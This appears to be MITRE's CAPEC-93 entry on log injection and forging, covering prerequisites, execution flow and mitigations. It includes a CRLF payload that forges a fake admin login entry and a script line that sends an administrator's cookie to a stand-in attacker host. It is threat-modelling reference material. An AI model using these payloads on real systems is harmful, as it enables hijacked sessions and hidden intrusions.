---
capec_id: CAPEC-93
name: Log Injection-Tampering-Forging
type: attack-pattern
abstraction: Detailed
likelihood: High
severity: High
related_cwe: [CWE-117, CWE-75, CWE-150]
related_attack: []
url: https://capec.mitre.org/data/definitions/93.html
tags: [mitre-capec, attack-pattern, CAPEC-93]
---

# CAPEC-93 - Log Injection-Tampering-Forging

**Abstraction:** Detailed  -  **Likelihood:** High  -  **Severity:** High  -  **CAPEC:** [CAPEC-93](https://capec.mitre.org/data/definitions/93.html)

## Description
This attack targets the log files of the target host. The attacker injects, manipulates or forges malicious log entries in the log file, allowing them to mislead a log audit, cover traces of attack, or perform other malicious actions. The target host is not properly controlling log access. As a result tainted data is resulting in the log files leading to a failure in accountability, non-repudiation and incident forensics capability.

## Prerequisites
- The target host is logging the action and data of the user.
- The target host insufficiently protects access to the logs or logging mechanisms.

## Skills required
- **Low**: This attack can be as simple as adding extra characters to the logged data (e.g. username). Adding entries is typically easier than removing entries.
- **Medium**: A more sophisticated attack can try to defeat the input validation mechanism.

## Consequences
- **Integrity**: Modify Data

## Execution flow
Execution Flow Explore Determine Application's Log File Format: The first step is exploratory meaning the attacker observes the system. The attacker looks for action and data that are likely to be logged. The attacker may be familiar with the log format of the system. Techniques Determine logging utility being used by application (e.g. log4j) Gain access to application's source code to determine log file formats. Install or obtain access to instance of application and observe its log file format. Exploit Manipulate Log Files: The attacker alters the log contents either directly through manipulation or forging or indirectly through injection of specially crafted input that the target software will write to the logs. This type of attack typically follows another attack and is used to try to cover the traces of the previous attack. Techniques Use carriage return and/or line feed characters to start a new line in the log file, and then, add a fake entry. For example: "%0D%0A[Thu%20Nov%2012%2011:22]:Info:%20User%20admin%20logged%20in" may add the following forged entry into a log file: "[Thu Nov 12 12:11:22]:Info: User admin logged in" Different applications may require different encodings of the carriage return and line feed characters. Insert a script into the log file such that if it is viewed using a web browser, the attacker will get a copy of the operator/administrator's cookie and will be able to gain access as that user. For example, a log file entry could contain new Image().src="http://xss.attacker.com/log_cookie?cookie="+encodeURI(document.cookie); The script itself will be invisible to anybody viewing the logs in a web browser (unless they view the source for the page).

## Mitigations
- Carefully control access to physical log files.
- Do not allow tainted data to be written in the log file without prior input validation. An allowlist may be used to properly validate the data.
- Use synchronization to control the flow of execution.
- Use static analysis tools to identify log forging vulnerabilities.
- Avoid viewing logs with tools that may interpret control characters in the file, such as command-line shells.

## Related weaknesses (CWE)
- [CWE-117](https://cwe.mitre.org/data/definitions/117.html)
- [CWE-75](https://cwe.mitre.org/data/definitions/75.html)
- [CWE-150](https://cwe.mitre.org/data/definitions/150.html)

Source: MITRE CAPEC - https://capec.mitre.org/data/definitions/93.html
